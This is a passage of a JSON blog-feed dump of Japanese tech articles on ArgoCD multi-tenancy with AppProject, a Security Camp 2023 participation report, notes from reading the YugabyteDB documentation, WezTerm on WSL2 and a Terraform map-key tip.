を用意します。AppProjectテナントは、例えば 赤線 の方法で、ArgoCD系カスタムリソースに対するapplication-controllerのReconciliationを制限します。ArgoCD系カスタムリソースをReconciliationできる場合正しいNamespaceに対してReconciliationを実行する場合、AppProjectテナントはこれを制限しません。(1) application-controllerは、argocd-cmd-params-cmから自身がアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、application-controllerは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) application-controllerは、同じNamespaceに所属するArgoCD系カスタムリソースに対して、Reconciliationを実行します。(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合例えば、application-controllerがReconciliationの対象とするNamespaceを選ぼうとしているとします。すると、application-controllerは内部で検証メソッドを実行し、無認可のNamespace (bar) は選ばないようにします。argo-cd/controller/appcontroller_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub07. おわりにKubernetesのマルチテナントパターンとArgoCDでのパターン実践をもりもり布教しました。あらゆる面からマニフェストのデプロイを制限してくれる、AppProjectテナントの素晴らしさが伝わりましたでしょうか。KubernetesのマルチテナントパターンをArgoCDでどう実践するべきか、について困っている方の助けになれば幸いです\uD83D\uDC4D謝辞本記事のタイトルは、私が崇拝しているドメイン駆動設計の書籍 \\"実践ドメイン駆動設計\\" から拝借しました\uD83D\uDE4Fまた、ArgoCDでのパターン実践の収集にあたり、以下の方からの意見も参考にさせていただきました。@toversus26 さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook: Kubernetes Automation in Practice (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","isoDate":"2023-08-18T02:06:46.000Z","dateMiliSeconds":1692324406000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"YugabyteDBのドキュメントを全部読む Day5","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/5_core_functions_universe_creation","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-Master serviceを読みました。今回はArchitecture > Core functions > Universe creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Universe creationYugabyteDBのユニバース作成は複数のステップを含む。Start YB-MastersYBユニバース作成の最初のステップはレプリケーションファクターで指定された数だけYB-Masterを作成することである。作成されたYB-Masterはそれぞれを認識している。YB-Masterはユニバース内でユニークなID(UUID)をそれぞれに割り当て、それぞれを認識しあったあとにリーダーエレクションを実行する。このステップの終りにYB-Masterの中のひとつがリーダーとして確立される。Start YB-TServersノードの数だけYB-TServerを起動し、それぞれにマスターのアドレスを渡す。それぞれのYB-TServerはマスターにハートビートを送信し、正常に動作していることを確認する。ハートビートはYB-TServerが現在ホストしているタブレットとその負荷情報についても通信するが、この時点ではタブレットにデータは登録されていない。Examples4ノードからなるYBユニバースにテーブルを作成する場合について考える。テーブルのレプリケーションファクターは3とする。3つのマスターがcreateモードで起動される。これはマスターがすでに起動しているために発生するエラーを防ぐために明示的に実行される。リーダーエレクションを実行し、リーダーを選出する。YB-TServerが起動し、全てのYB-TServerがマスターにハートビートを送信する。","isoDate":"2023-08-16T13:49:19.000Z","dateMiliSeconds":1692193759000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"セキュリティ・キャンプ 2023 参加記","link":"https://moz-security.hatenablog.com/entry/2023/08/15/015853","contentSnippet":"8月7日から8月11日まで開催されたセキュリティ・キャンプの Bクラス（Webセキュリティ）に参加してきたので、やってきたことや感想について、体験記として書き残そうと思う。セキュリティ・キャンプについては、以下のホームページを参照してほしい。今年が20回目の開催で、4年ぶりに対面で行われた。www.ipa.go.jp応募課題まず、セキュリティ・キャンプに参加するには、応募課題を解かなければならない。これに関しては、また別のブログとして、私の答案については出そうと思うが、今までのプログラミング言語やコンテナ技術の利用経験を問われたり、Webにおける脆弱性の検証と調査、Webの標準や実装の調査を行なって、それをレポートとしてまとめ、提出した．応募課題は、下記のURLにある。セキュリティ・キャンプ全国大会2023 応募要項（エントリー） | デジタル人材の育成 | IPA 独立行政法人 情報処理推進機構共通講義共通講義では、行動経済学やXR、国際政治とセキュリティといったものやサイバー犯罪についての講義があった。これらについてはあまり書かないが、日頃勉強している技術的なもの以外の部分について学ぶことができるいい機会であり、新鮮であった。サイバーセキュリティという分野は、法律・犯罪と密接に関連してくるにも関わらず、グレー部分の範囲がとても広くて、どこまでが許されて、どこからがダメなのかという判断が難しい。そのため、ワークショップの形で弁護士や検事の方の考えを知ることができたのはよかった。講義の中でも仰っていたが、私はあくまで技術者であり、法律家ではない。だからこそ、”わかった気にならない”という点は気をつけようと思った。専門講義専門講義では、各クラスによって講義が変わってくる。Bクラスでは、Webセキュリティをテーマにして、講義が構成されている。基本的には４時間の講義で、どれも座学と演習が 1:1 くらいの割合になっており、手を動かしたり、ツールの動きを確認しながらだったため、概念だけでなく、実装も学べたし、何よりも楽しかった。講師の方が一般に公開している資料については一緒に貼っている。1日目B-1 Webプロダクトセキュリティへの誘い最初の講義は、初日の18:30~20:30に行われた。この講義では、プロデューサーがどのような意図を持って講義を構成したか、何を学んでほしいのかというところを整理した。このクラスでは、\\"将来と今の両方を考えて、意思決定ができるリーダーになること\\" を目標としており、その時点でいろいろ考えさせられた．私の感覚では、すごいセキュリティエンジニアというのは、技術のことをたくさん知っていることだったからである．でも、実際に社会に出ると、技術とは違ったベクトルの強さというものが必要だとわかった．これに関しては、 この時点でも納得はしていたが、B-5やB-7の講義を受けた後により強く実感した．技術的な強さだけであれば、5日間ひたすらWebアプリケーションの脆弱性を勉強して、探せばいいが、そのような構成にはなっていない．\\"How と Why を考えながら受講すること\\"というのは念を押されたが、これに関しては、非常に大切なことであり、日頃から意識する必要があると感じた。また、B-2からB-7の講義に関して、自分がどこまでわかっていて、どのようなことを学べそうか、何を習得することを目標にするかというのを考えて、グループワークでお互いに共有した．1つ例を挙げると、B-2の講義に関して、サイバーキルチェーンやActive Directoryはわかるが CI/CDパイプライン を狙った攻撃とはなんなのか、加えて攻撃者はどういう視点とか考えで攻撃を計画するのかというのはわからないから学びたいというのがあった．2日目B-2 開発のプロセスを攻撃者の視点で捉えるこの講義は、2日目の8:30~12:30に行われた．この講義では、なぜ攻撃をするのかというところから始まり、レッドチーム演習の効果やサイバーキルチェーンと攻撃フローについて座学で学んだ．また、仮想環境で攻撃演習を行うことで、実際に攻撃フローを見ることができた．演習で自分で攻撃してみることで、攻撃者の視点というものをより実感することができた．最終的には、防御側ができることを考えたが、攻撃者の視点を持つことで、より深く考えることができた．レッドチーム演習の情報はWebで調べてもあまり出てこないため、その界隈の第一人者の方から、生の声を聞けたのはよかったし、貴重な経験になった．最近、Hack The Boxに取り組めていなかったが，講義を受講して、モチベーションが上がり、また再開した．この講義では、CI/CD環境のセキュリティについても学んだ．オンプレミスからクラウドへと環境の変化はあるが、\\"攻撃方法は変わったとしても、攻撃の流れは変わらない\\"というのが大事な点であった．例えば、攻撃モデルの一つにサイバーキルチェーンがあるが、この考え方はオンプレでもクラウドでも関係なく、有効である．今までCI/CDを狙った攻撃というのは全く想像もつかなかったが Github Actions などの CI/CD Configuration から Credential が漏洩したり、3rd party tool を汚染することで莫大な被害につながるといった CI/CD Pipeline への攻撃もなんとなく理解できた．B-3 クラウドネイティブセキュリティの実践と戦略この講義は、2日目の13:30~17:30に行われた．この講義では、そもそもクラウドネイティブとはなんなのかの説明を受けたのちに、Kubernetesが提供する耐障害性の機能やマイクロサービスのセキュリティについて学んだ．k8sを実際に動かして、アプリケーションのスケーリングの様子などを確認しながら進めることができたのはとてもよかった．また、コンテナから権限掌握→AWSアカウントの侵害という演習を通して、クラウドネイティブ環境を構築・運用するにあたって、どのようなことに気をつけなければならないかといったことを学んだ．k8sのセキュリティモニタリングに関して、eBPFの紹介も少しあった．事前課題や講義を通して、最低限 k8s が動かせるようになったり、提供している一部の仕組みについてはわかったりしたが、まだまだ知らない機能はたくさんあるし、現在進行形で新たな技術が生まれている分野である．たしかにクラウドネイティブ環境の構築・運用は難しいのかもしれないが、技術の面白さというのはとても感じたし、もっともっと学んでいきたいと思った．3日目B-4 Webサービスにおける安全な認証とID連携の実装この講義は、2日目の14:00~18:00に行われた．この講義では、最初に認証・認可の技術であるFIDO, WebAuthn, Passkey, OAuth, OpenID Connect についての用語とそれぞれの用語の関係に関して説明を受けた．各用語は知っているが、説明できるほどの理解はできていなかったため、整理して学ぶことができ、理解できた．また、認証・認可はWebアプリにおいて最もクリティカルな箇所であり,セキュリティも十分に配慮しなければならない．CSRFの発生メカニズムを押さえ、どうすれば防ぐことができOpenID Connectではどのような処理フローになっているのかを学ぶことで、安全な認証・認可を実現する仕組みについて理解できた．その後、パスキーのハンズオンとOpen ID Connectのハンズオンを行なった．ハンズオンでは、プログラムの穴あき部分を埋めることで、ちゃんと機能が実装できているか確認しながらステップアップ形式で進めた．ID連携やパスキーの実装となると、難しいイメージだったが、すでにあるライブラリを使うことで、簡単に実装することができた．一度学んだとしても、使わなければ忘れてしまうため、Webアプリケーションを開発するときに、今回学んだ技術を組み込むことで、さらなる理解と自分で使える技術にしたいと思う．B-5 適応し続けるプロダクトセキュリティ speakerdeck.com\xa0この講義は，3日目の19:00~20:40に行われた．この講義では，組織やプロダクトの変化に対して，セキュリティをどう確保するのか考える技術者というよりは，CISOといったセキュリティにおいてリーダーシップを発揮し，変化に対応する組織を作るにはどうすればいいのかといったことを学んだ．プロデューサーの\\"将来と今の両方を考えて，意思決定ができるリーダーになること\\"という思いが最も顕著に出ている講義であった．昨今の世の中は，プロダクトも組織もどんどん変化する時代であり，その変化に応じて，セキュリティのあり方も変わってくる．セキュリティの難しさはどこか一つでも弱い部分があってはいけないというところである．サービスを提供する場合，何か一つ強みがあれば，それで大ヒットするかもしれないが，セキュリティは全てが一定水準にならなければならない．プロダクト運営に求められるセキュリティは幅広いが，バランスよく，少しずつ積み重ねていくことが大事だとわかった．個人的には，セキュリティ人材が置かれる現実と求められることというところが面白く，より優れたセキュリティ人材，セキュリティ分野でリーダーシップを発揮して組織を変えるには，人間としての成長が不可欠だとわかった．\\"深化と探索のバランスとそれらの継続\\" が重要になってくると学んだ．将来は，セキュリティ関連の仕事をしたいとは思っていたが，CISOのようなリーダーシップを発揮して組織を変えていくということは考えたことがなかった．セキュリティ人材として成長するために，人間的な成長が必要になるというのは面白かった．4日目B-6 ソースコード解析によるWebアプリケーションの脆弱性調査この講義は，4日目の8:30~12:30に行われた．この講義では，ソースコードから脆弱性を探す方法について学んだ．最初に，静的解析で見つけやすい脆弱性の説明を受け，演習として，まずは，脆弱性を手動で探した．CVEが3つ取り上げられており，それらの脆弱性をNVDやそこに載っているGithubのPatchのプログラムやPoCを見て，調査した．プログラムベースで実際にどのような入力値であれば，脆弱性が悪用できるのかを探すのがこの調査のゴールであった．しかし，複雑なWebアプリケーションになると，大量の関数呼び出しによって，コードを追うのが大変になる．そこで，脆弱性調査の自動化のためのツールとして，CodeQLの説明があり，その後の演習で実際に使って，調査を行った．CodeQLを使うことで，特定の関数呼び出しや変数宣言，構文パターンを抽出することができ，脆弱性となりうるコードが含まれていないか簡単に調査できることがわかった．プログラムを書くことはあっても，解析して脆弱性を探し出すといったことはやったことがなかったため，新たな知見が得られたのはよかったし，楽しかった．自分で書いたコードに対して，脆弱性を探し，修正するといったことやバグバウンティに取り組むといったことも今後していきたいと思った．B-7 Policy as Code 入門docs.google.comこの講義は，4日目の13:30~17:30に行われた．この講義では，ポリシーをコードとして書くことで，k8sの設定ファイルやクラウドサービスのリソース状態の監視結果に対して制約を満たすかどうかチェックすることができるといったことを学んだ．この講義に関しても，B-5と同じで，一見セキュリティと関係ないため，今まで勉強してきたことがなかったが，クラウドサービスのリソースにポリシーを定義して不要なポートが開いてないかやクレデンシャルが書き込まれていないかなどのチェックはセキュリティ向上のためにも有効である．一部の先進的な組織しかPolicy as Codeを実践できていないという部分で，まだまだ新しい技術ではあるが，この講義を通して，こういうものがあるということを知れたのはよかった．演習では，3以降のよりリアルなポリシーになった途端に難しく，書くのに苦戦した．いつ使うことになるかわからないが，このようなものがあるというのを覚えておいて，いざという時に使えるようにしたいと思う．講義全体を通してB-1からB-7まで非常に幅広い分野の講義があり，それに加え，どの講義も4時間で終わり切らない程濃密なものであったため，まだ整理ができていない部分も多々ある．本当に知識をひたすら叩き込まれた感じであるため，また時間を取って整理して，理解したいと思う．4日間講義があり，ホームルームの時には思考停止するほどの疲れがあったが，講義内容の濃さと演習の楽しさでものすごい充実感はあった．あと，講義のレベルも高く，わからない箇所があったりもしたが，講師の方やチューターの方に質問するとなんでも教えてくださったため，問題なく演習を進めたり，疑問点を残すことなく学ぶことができた．対面での開催について今年は，4年ぶりの現地開催ということだったが，本当に楽しかった．5日間だけで，たくさんの人に出会ったし，たくさん話した．基本的にクラスで講義を受けるため，クラスの人とはずっと一緒にいることになり，仲良くなるが，だからこそ，食事のときや名刺交換会というのは違うクラスの子とも知り合ういい機会だった．ジュニアで参加している中学生とかから同世代の受講生やチューター，実際に社会で活躍している講師の方たちまで異なる立場や年齢の人たちと話すことができたのはよかった．X（Twitter）の中でよく見るすごい人たちと面と向かって話したり，議論できたりするのは楽しかったし，とても刺激を受けた．授業はもちろん素晴らしいのだが，同世代で自分よりもすごい人たちと出会い，それによってモチベーションが爆増するというのが個人的にはセキュリティ・キャンプに参加する一番のよさだと思う．学内という狭い世界で自分はそれなりにできると思っていても，全国から人が集まってくるセキュリティ・キャンプでは上には上がたくさんいるというのをすごい体感したし，もっと頑張ろうと思った．参加した感想今年22歳になるため，今年が最後のチャンスだったが，本当に参加することができて良かった．キャンプ参加が決まった後も，講義に対してワクワクしながらも，一方で講義についていけるのか，私みたいな人が行って大丈夫なのか，他の人たちはやっぱりつよつよなのかという不安はあったが，そんな不安は初日で解消した．たしかに，みんなすごい人たちだったが，コミュニケーションを取る上では，ITに興味があるというその一点だけで仲良くなることができたし，講義でわからないことがあったとしても，他の受講生やチューター，講師の方に聞いたらちゃんと教えてくださった．セキュリティに興味があるのなら，少しでも早いうちから応募課題に挑戦するべきだと思うし，そこで得られるものはたくさんある．たとえ，課題で落ちてしまったとしても，課題を解くことに意味があり，それだけでも知らないことをたくさん学ぶことができる．セキュリティ・キャンプ 2023 に参加したからこそ，心の底から参加することを勧めたい．来年は，チューターかネクストキャンプ受講生としてまた戻って来たいと思う．まとめ・どの講義も濃密で、わからない部分もあったが、チューターや講師の方のサポートもあり、なんとかついていくことができた．・やっぱり対面での開催はいい．・全国のすごい人たちを間近に見ることができ、刺激がもらえる．・セキュリティに興味がある人はもちろん、ITに興味がある人全員にセキュリティ・キャンプを進めたい．","isoDate":"2023-08-14T16:58:53.000Z","dateMiliSeconds":1692032333000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"WezTerm で快適な WSL2 環境にする","link":"https://blog.1q77.com/2023/08/wezterm-on-windows/","contentSnippet":"家の自分用 Laptop はずっと Linux を使ってきましたが、数か月前に Inspiron 14 に買い替えたタイミングで Ubuntu 22.04 にしてからやっぱり不便だなあとも思っていました。(InputMethod の切り替えで直接入力とひらがなだけにしたいのに Hankaku ってのが外せないとか、電源管理回りとか、snap でインストールしたアプリは日本語入力できないとか)","isoDate":"2023-08-12T11:07:01.000Z","dateMiliSeconds":1691838421000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"YugabyteDBのドキュメントを全部読む Day4","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/4_key_concepts_yb_master_service","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-TServer serviceを読みました。今回はArchitecture > Key Concepts > YB-Master serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。YB-Master serviceYB-Masterサービスはテーブルやそのタブレットの場所、ユーザー・ロールの権限といったシステムのメタデータとレコードの管理を行っている。それに加えYB-Masterはロードバランシングやレプリケーションの開始といったバックグラウンドオペレーションの管理や、テーブルのCREATEやALTER、DROPといった様々な管理オペレーションの責任を持つ。YB-MasterはRaft Groupを組むことで高可用性を実現し、またテーブルに対するI/Oの単一障害点にならない。Functions of YB-MasterYB-Masterはシステムの重要な機能を複数持っている。Coordination of universe-wide administrative operationsCREATE TABLEやALTER TABLE、DROP TABLEといったユーザーからのリクエスト処理やバックアップの実行などUniverseをまたぐオペレーション実行の調整を担当している。YB-Masterではこれらのオペレーションがテーブルを保持するYB-TServerの状態に関わらず、全てのテーブルに伝搬されることを保証する。YugabyteDBは分散システムのため、Universeをまたぐ処理中にYB-TServerに障害が発生し一部のタブレットへの適用に失敗してもオペレーションの結果に問題が発生しないことが重要だからである。Storage of system metadataそれぞれのYB-Masterではネームスペースやテーブル、ロール、パーミッション、YB-TServerへ割り当てたテーブル情報を含むシステムメタデータを保存している。これらのシステムレコードはYB-Masterを対象にRaftグループを組みレプリケーションすることで冗長性を実現している。またシステムレコードはYB-Masterが管理するDocDBに保存される。Authoritative source of tablet assignments to YB-TServersYB-Masterは全てのテーブルとそれらをホストするYB-TServerの情報を保存している。一般のクライアントではそれらの情報はクライアントからクエリレイヤなどを通して取得された上で、クライアントにメタデータを返しデータアクセスが行なわれる。一方でスマートクライアントではYB-Masterに保存されたメタデータを利用して特定のYB-TServerが保持するタブレットやキャッシュを利用することが出来るため、データアクセス時のネットワークをまたぐ通信を減らすことができパフォーマンスを高めることができる。Background operationsいくつかのオペレーションはUniverseのライフタイムを通してバックグラウンドで行なうことで、フォアグラウンドのRead/Writeに影響を与えずに実行することが出来る。Data placement and load balancingYB-MasterのリーダーはCREATE TABLE時にタブレットの初期配置をYB-TServerをまたいで行なう。そのときにユーザー定義のデータ配置制約を強制し均一な読み込みを保証する。Universeのライフタイム中のノード追加や障害が発生しても、負荷分散を継続しデータ配置の制約を自動的に適用する。Leader balancing複数のYB-TServerに配置されたタブレットへのアクセスがUniverseをまたいで分散されることを保証している一方で、YB-Masterは対象となるノード1間でそれぞれのノードが同じ数のtablet-peer leader2をもつことを保証する。Rereplication of data on extended YB-TServer failureYB-Masterは全てのYB-TServerからハードビートシグナルを受け取ることでYB-TServerの死活監視を行なっている。そしてYB-MasterはYB-TServerの異常を検知したときに、どれぐらいのあいだYB-TServerが異常であったかを追跡する。閾値を超えると、YB-Masterは障害中のYB-TServerに配置されていたタブレットを再配置するYB-TServerを探し、レプリケーションを実行する。レプリケーションはYB-Masterリーダーに抑制された状態で実行されるため、Universeのフォアグラウンドオペレーションには影響をおよぼさない。Raft Groupのリーダーになれるノード↩↩","isoDate":"2023-08-03T14:48:34.000Z","dateMiliSeconds":1691074114000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day3","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/3_key_concepts_yb_tserver_service","contentSnippet":"YugabyteDBのドキュメントを全部読む Day3前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > Universeを読みました。今回はArchitecture > Key Concepts > YB-TServer serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。それはそれとして技術系の単語をカタカナ表記で誤魔化していて、体系的に学んでいないことがバレてしまう。特にストレージまわりが分からない……YB-TServer serviceYB-TServer(YugabyteDB Tablet Servcer)はユーザからの受けつけたYugabyteDBクラスタへのリクエストのI/Oの処理をする。テーブルのデータは一つ以上のTablet peerに分割(シャーディング)される。peerの数はレプリケーションファクターによって決定される。YB-TServerは一つ以上のTablet peerをホストする。Tablet peerはRaftグループを形成してグループ間でデータの複製を行ない、タブレットはYB-TServer上で最大の効率になるように管理される。Server-global block cacheブロックキャッシュは一つTB-TServer上の異なるタブレット間で共有される。YB-TServerのメモリ効率は一つのテーブルからの読み込みが多いほど最適化される。Space AmplificationYugabyteDBではSize-tired Compactionというライトアンプリフィケーション1が小さい圧縮方式を利用している。Size-tired Compactionはスペースアンプリフィケーション2が大きいという問題があるが、YugabyteDBではテーブルは複数のタブレットに分割され、タブレット間でのConcurrent Compactionは特定の最大値まで絞られるため問題になりにくい。YugabyteDBでは凡そ10-20%のスペースアンプリフィケーションにおさまる。つまりSize-tired Compaction一単位が扱うデータ量を小さく(タブレット化)して、同時に実行される圧縮処理数を絞ることで特定のタイミングで圧縮に使用されるストレージ容量を抑えているということ？Throttled compactionsYB-TServerではタブレット間で実行される圧縮処理の同時実行数を制限することで、圧縮処理が多量のリソースを占有することを防いでいる。この機能は圧縮されるファイル同士のサイズを比べ、実行される圧縮処理が妥当であることを確認することで実現されている。Small and large compaction queuesYB-TServerでは圧縮処理を大きい圧縮処理と小さい圧縮処理に分けて優先度を決めることで、I/Oが大きな場合でもシステムの機能を保っている。YugabyteDBでは圧縮処理数を制限することに加え、様々な最適化を実行することで圧縮処理の影響を最小化している。Manual compactionYugabyteDBではyb-admin utilityのcompact_tableコマンドにより、任意のタイミングでテーブルに対して圧縮を実行することが出来る。この方法はデータが新しく書き込まれない場合や、DDLやTTLの超過によるデータ削除時によりデータが断片化したときに有効である。Statistics-based full compactions to improve read performanceYugabyteDBでは読み込まれたkey-valueペアをDocDBレベルで監視している。監視対象となる時間軸はauto-compact-stat-window-secondsで管理されている。YugabyteDBがデータ読み込み時に多量の廃棄されたデータのスキップを検知した場合、full compactionがトリガーされ不要なキーの削除が行なわれる。Full compactionがトリガーされる詳細な条件は対象の時間軸で以下が満された時である。廃棄されたキーとアクティブなキーが読まれる割り合いがauto-compact-percent-obsoleteで定義された閾値を超たとき。廃棄されたキーの読み込みauto-compact-min-obsolete-keys-foundで定義された閾値を超たとき。この機能はTTLを設定したテーブルと互換性があり、TTL file expirationが有効なテーブルではスケジュールされた圧縮を実行しない。Scheduled full compactionsYugabyteDBでは全てのデータに対するデータ圧縮をスケジュール実行することが出来る。スケジュール実行はscheduled-full-compaction-frequency-hoursとscheduled-full-compaction-jitter-factor-percentageのフラグで管理される。この機能は大量のDELETEとUPDATEを定常的に実行するワークロードでのパフォーマンスとディスクスペースの再割り当てに有効である。スケジュール化したデータ圧縮はTTLと互換しているが、TTL file expirationとは互換していない。つまりスケジュールされた圧縮は実行されない。Server-global memstore limitServer-global memstore limitは一つのYB-TServer上のタブレット間でシェアされるメモリサイズを追跡し、強制する。この機能はタブレット間の書き込みに偏りがある場合に有効である。一つのテーブルに書き込みが集中しているばあい、メモリ制限以上のメモリを割り当てることでパフォーマンスを向上させることが出来る。Auto-sizing of block cache and memstoreBlock Cacheとmemstoreは何れも多量のメモリを使用している。これらはtablet-peer間で共有されるリソースのため、メモリ管理とこれらのコンポーネントの様々な環境に合せたサイジングを容易にしている。YB-TServerでは自動で特定の割合のメモリをBlock CacheとMemstoreに割り当てる。Distributing tablet load uniformly across data disks複数のSSDを利用するハードウェアでは、テーブルのデータ(SSTable)とWALはテーブル毎に利用可能なディスクに均等に分散される。このストライピングと呼ばれる負荷分散は、それぞれのディスクがそれぞれのテーブルの負荷を均等に処理することを保証する。SSDで実際に書き込んだデータより書き込み量が増幅する現象。もちろんライトアンプリフィケーションが小さいほうが望ましい。↩↩","isoDate":"2023-08-02T16:13:24.000Z","dateMiliSeconds":1690992804000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day2","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/2_key_concepts_universe","contentSnippet":"YugabyteDBのドキュメントを全部読む Day2前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Design goalsを読みました。今回はArchitecture > Key Concepts > Universeを読みます。また画像は同ドキュメントより引用しています。UniverseYugabyteDBは耐久性とスケーラビリティを兼ねそなえた分散データベースを達成するために、Universe1と呼ばれるノードのグループを持っている。Universeはビジネス要件やレイテンシの兼ね合いでシングルゾーン、単一リージョンマルチゾーン、マルチリージョン、同期・非同期レプリケーションなどを選択することが出来る。UnivereはClusterと表現されることもある。データの構成Universeは一つ以上のネームスペースを持つことができ、またネームスペースは一つ以上のテーブルを持つことができる。YugabyteDBではUniverse上に存在するノードにまたがって保持されるテーブルを設定に従って、シャーディングし、レプリケーション、ロードバランシングを行なう。YugabyteDBはノードやディスク、ゾーンなどに発生した障害に自動で対応し、必要であればデータを新規に分散、レプリケーションを行なう。ネームスペースはYSQLではデータベースに対応し、ほかのDBにおけるネームスペースに対応する2。YCQLではキースペースに対応し、Cassandraのキースペースに対応している。サービスコンポーネントUniverseはYugabyteDB Tablet Server(YB-TServer)とYugabyteDB Master Server(YB-Master)の二つで構成されている。YB-MasterとYB-TServerはRaftにより分散されており、高可用性を達成している。YB-Tserverはテーブルを始めとしたユーザーデータの保存、提供を担当する。YB-Masterはシステムのメタデータを管理し、システム全体のテーブルに対するDDLやメンテナンスの実行、ロードバランシングといったオペレーションを管理する。UniverseとClusterUniverseは一つのプライマリクラスタとゼロ個以上のレプリカクラスタによって構成されている。プライマリクラスタプライマリクラスタはRead/Write両方の実行と、プライマリクラスタ内のノード間の同期的なレプリケーションを担当する。リードレプリカクラスタリードレプリカクラスタはRead処理のみを実行する。Write処理は自動的にプライマリクラスタにルーティングされる。リードレプリカクラスタを利用することで、地理的に分散したデータに対する読み取りの遅延を小さくすることができる。データはプライマリクラスタから非同期的にとりこまれる。これはRaftの書き込みには関与しないRaftオブザーバとして機能する。GoogleのCloud Spannerでも同様にUniverseと呼ばれている↩PostgreSQLではSchemaの裏側に存在するデータ構造↩","isoDate":"2023-07-26T15:03:13.000Z","dateMiliSeconds":1690383793000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day1","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/1_design_goals","contentSnippet":"Day1最近Twitter改めXで「俺はDBのドキュメント端から端まで読んで強くなった」というX\'s1を複数みかけました。周りのエンジニアに一歩差をつける方法として、フレームワークやミドルウェアやライブラリのドキュメントを最初から最後までちゃんと読む、というのがあって、これはマジでコスパ抜群です。— 徳永広夢 (@tokuhirom) July 21, 2023 確かに私のRedisはこれ。 https://t.co/2y1E01aLGw— maru (@maruloop) July 22, 2023 私のMySQLもこれ。 https://t.co/BxiOjeQVPk— yoku0825 (@yoku0825) July 22, 2023 俺のpostgresqlもこれ。 https://t.co/URRjyXCpGI— そーだい@初代ALF (@soudai1025) July 22, 2023 PostgreSQL系NewSQLで最強になりたいのでYugabyteDBのドキュメントを順番に読んで行きます。ドキュメントはv2.19に対応したものです。手始めにArchitectureの一番先頭にあるDesign goalsから読みはじめます。また画像は同ドキュメントより引用しています。Design goalsYugabyteDBは以下を達成することを目標としている。1. 分散トランザクションを提供しながら強い一貫性を保証する。2. Query APIを再発明せず、既存のクエリ言語への互換を達成する。3. 高いパフォーマンスを保証する。4. 地理的に分散したデプロイを可能にする。5. Cloud Native Databaseとしてデザインする。一貫性分断耐性YugabyteDBはCAPの定理で言えばCPを中心に高い可用性を供えたデータベースネットワーク分断などを起因とするSplit BrainはRaft Group内であたらしいリーダーを選出することで対応している。YugabyteDBではLeader Leaseという障害が発生しても常に一つのリーダが存在することを保証する仕組みを実装している。直列化可能性single-row Linearizable writeをサポートしている。ACIDトランザクションYugabyteDBではSeriarizable、Repetable Read、Read Committed Isolationの三つの分離レベルをサポートしている。YSQL APIではこれら3つの分離レベルをサポートしているが、YCQLではRepeatable Readのみに対応している。Query APIYugabyteDBではYSQLとYCQLという2種類のQuery APIをサポートしている。YSQLYSQLはPostgreSQLに互換したAPIでPostgreSQLのクエリレイヤを再利用している。新しい変更は互換性を崩さない。YSQLは新しいPostgreSQLに互換しつづけることを目標としている。YCQLYCQLはCassandraのクエイ言語から派生した半リレーショナルなクエリ言語で、Webスケールな膨大なwriteに対応してスケールし素早いデータ取得を目標としている。パフォーマンスC++で実装されているため高いパフォーマンスと巨大なHeap(RAM)をCacheとして利用できる。SSDとNVMeに最適化している。高いWriteスループットとクライアントの同時実行性、高いデータ密度、増加し続けるデータへの対応を目標としている。地理的分散Zone、Multi Region、Multi Cloudいずれにも対応している。これに対応するために、ノード障害やトラヒックのルーティングなどに対応できる必要がある。クラウドネイティブアーキテクチャパブリッククラウドやオンプレミスで利用される一般てきなハードウェアで利用可能にする。原子時計のような特別なものに依存しない。Kubernatesに対応している。OSSで提供している。https://twitter.com/SawyerMerritt/status/1683365478582951936↩","isoDate":"2023-07-25T15:01:52.000Z","dateMiliSeconds":1690297312000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Terraformでmapにkeyが含まれないときにスキップしたい","link":"https://zenn.dev/nnaka2992/articles/skip_when_key_does_not_exists_in_map_terraform","contentSnippet":"Google CloudではPublic IPを利用した際に割り振られる可能性のあるCIDRの一覧がcloud.jsonでJSON形式で公開されています。この記事は雑な検証用のTerraformで承認済みネットワークにasia-notheast1のCIDRを全部登録してやろうとしたとき、上記のJSONファイルからscopeがasia-northeast1のprefixes.ipv4Prefixを抜きだそうとしたときにハマったのでその対応方法のメモです 結論以下のような感じで書いたら対応できました。contains(keys(hoge), \\"fuga\\") # hogeのkeyにh...","isoDate":"2023-07-22T14:53:12.000Z","dateMiliSeconds":1690037592000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes の upstream のキャッチアップ","link":"https://zenn.dev/toversus/articles/52b107ab103712","contentSnippet":"先日、Kubernetes Meetup Tokyo #59 で「KEP から眺める 